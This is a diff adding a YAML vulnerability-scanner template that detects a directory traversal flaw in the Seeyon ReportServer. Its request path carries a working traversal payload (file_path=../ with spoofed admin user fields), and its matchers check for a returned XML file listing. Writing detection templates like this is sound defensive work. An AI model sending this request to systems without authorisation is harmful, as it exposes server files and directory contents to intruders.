@@ -1,0 +1,26 @@
+id: seeyon-reportserver-traversal
+
+info:
+  name: Seeyon ReportServer Directory Traversal
+  author: local
+  severity: high
+  description: Detects directory traversal in the Seeyon ReportServer integration.
+  tags: seeyon,zhiyuan,directory-traversal,file-read,active
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0" encoding="UTF-8"?>'
+          - '<NODES '
+          - '</NODES>'
+        condition: and
+
